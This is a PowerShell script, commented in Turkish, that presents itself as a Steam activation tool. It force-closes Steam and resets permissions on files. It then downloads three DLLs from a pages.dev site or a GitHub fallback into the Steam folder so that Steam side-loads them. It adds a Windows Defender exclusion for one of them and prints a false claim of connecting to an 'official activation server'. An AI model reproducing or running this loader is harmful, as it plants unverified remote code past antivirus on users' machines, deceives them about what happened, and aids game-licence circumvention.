cls
[Console]::InputEncoding = [System.Text.Encoding]::UTF8

$localPath = Join-Path $env:LOCALAPPDATA "steam"
$steamRegPath = 'HKCU:\Software\Valve\Steam'
$steamToolsRegPath = 'HKCU:\Software\Valve\Steamtools'
$steamPath = ""

# --- Yardımcı Fonksiyonlar ---

function Remove-ItemIfExists($path) {
    if (Test-Path $path) {
        # İzinleri varsayılan hale döndür
        Start-Process cmd -ArgumentList "/c icacls ""$path"" /reset /T /C" -WindowStyle Hidden -Wait
        # Dosya özniteliklerini temizle
        Start-Process cmd -ArgumentList "/c attrib -s -h -r ""$path""" -WindowStyle Hidden -Wait
        # Sil
        Remove-Item -Path $path -Force -ErrorAction SilentlyContinue
    }
}

function ForceStopProcess($processName) {
    Get-Process $processName -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 2
    if (Get-Process $processName -ErrorAction SilentlyContinue) {
        Start-Process cmd -ArgumentList "/c taskkill /f /im $processName.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue
    }
}

function CheckAndPromptProcess($processName, $message) {
    while (Get-Process $processName -ErrorAction SilentlyContinue) {
        Write-Host $message -ForegroundColor Red
        Start-Sleep 1.5
    }
}

# --- Başlangıç İşlemleri ---

$filePathToDelete = Join-Path $env:USERPROFILE "get.ps1"
Remove-ItemIfExists $filePathToDelete

ForceStopProcess "steam"
if (Get-Process "steam" -ErrorAction SilentlyContinue) {
    CheckAndPromptProcess "Steam" "[Please exit Steam client first]"
}

# Steam Yolu Kontrolü
if (Test-Path $steamRegPath) {
    $properties = Get-ItemProperty -Path $steamRegPath -ErrorAction SilentlyContinue
    if ($properties -and 'SteamPath' -in $properties.PSObject.Properties.Name) {
        $steamPath = $properties.SteamPath
    }
}

if ([string]::IsNullOrWhiteSpace($steamPath) -or -not (Test-Path $steamPath -PathType Container)) {
    Write-Host "Official Steam client is not installed on your computer. Please install it and try again." -ForegroundColor Red
    Start-Sleep 10
    exit
}

# Eski dosyaları temizle
$verPath = Join-Path $steamPath "winhttp.dll"
$DWMPath = Join-Path $steamPath "dwmapi.dll"
$xinputPath = Join-Path $steamPath "xinput1_4.dll"

Remove-ItemIfExists (Join-Path $steamPath "version.dll")
Remove-ItemIfExists $verPath
Remove-ItemIfExists $DWMPath
Remove-ItemIfExists $xinputPath

# --- Ana Fonksiyon ---

function PwStart {
    param(
        [string]$githubBaseUrl = "https://github.com/WolfGames156/zdb2/raw/refs/heads/main"
    )

    try {
        if (!$steamPath) { return }
        
        if (!(Test-Path $localPath)) {
            New-Item $localPath -ItemType directory -Force -ErrorAction SilentlyContinue
        }

        # Steam yapılandırma temizliği
        Remove-ItemIfExists (Join-Path $steamPath "steam.cfg")
        Remove-ItemIfExists (Join-Path $steamPath "package\beta")
        Remove-ItemIfExists (Join-Path $env:LOCALAPPDATA "Microsoft\Tencent")
        
        try { Add-MpPreference -ExclusionPath $verPath -ErrorAction SilentlyContinue } catch {}

        # İndirme Listesi ve Fallback Mantığı
        $filesToDownload = @(
            @{ Name = "winhttp.dll"; Local = $verPath; Primary = "https://zdb2.pages.dev/winhttp.dll" },
            @{ Name = "dwmapi.dll"; Local = $DWMPath; Primary = "https://zdb2.pages.dev/dwmapi.dll" },
            @{ Name = "xinput1_4.dll"; Local = $xinputPath; Primary = "https://zdb2.pages.dev/xinput1_4.dll" }
        )

        foreach ($file in $filesToDownload) {
            $success = $false
            
            # 1. Deneme: Ana Sunucu
            try {
                Invoke-RestMethod -Uri $file.Primary -OutFile $file.Local -ErrorAction Stop
                $success = $true
            } catch {
                Write-Host "Primary source failed for $($file.Name), trying fallback..." -ForegroundColor Yellow
            }

            # 2. Deneme: Fallback (GitHub)
            if (-not $success) {
                try {
                    $fallbackUri = "$githubBaseUrl/$($file.Name)"
                    Invoke-RestMethod -Uri $fallbackUri -OutFile $file.Local -ErrorAction Stop
                    $success = $true
                } catch {
                    Write-Host "Failed to download $($file.Name) from both sources." -ForegroundColor Red
                }
            }
        }

        # Steam'i Başlat
        $steamExePath = Join-Path $steamPath "steam.exe"
        Start-Process $steamExePath
        Start-Process "steam://"
        
        Write-Host "[Successfully connected to official activation server. Please login to Steam to activate]" -ForegroundColor Green

        for ($i = 5; $i -ge 0; $i--) {
            Write-Host "`r[This window will close in $i seconds...]" -NoNewline
            Start-Sleep -Seconds 1
        }

        # Pencereyi kapatma mantığı
        $instance = Get-CimInstance Win32_Process -Filter "ProcessId = '$PID'"
        while ($null -ne $instance -and ("powershell.exe", "WindowsTerminal.exe", "pwsh.exe" -contains $instance.ProcessName)) {
            $parentProcessId = $instance.ProcessId
            $instance = Get-CimInstance Win32_Process -Filter "ProcessId = '$($instance.ParentProcessId)'"
        }
        if ($null -ne $parentProcessId) {
            Stop-Process -Id $parentProcessId -Force -ErrorAction SilentlyContinue
        }

        exit
    } catch {
        Write-Host "An unexpected error occurred." -ForegroundColor Red
    }
}

# Scripti Çalıştır
PwStart -githubBaseUrl "https://github.com/WolfGames156/zdb2/raw/refs/heads/main"
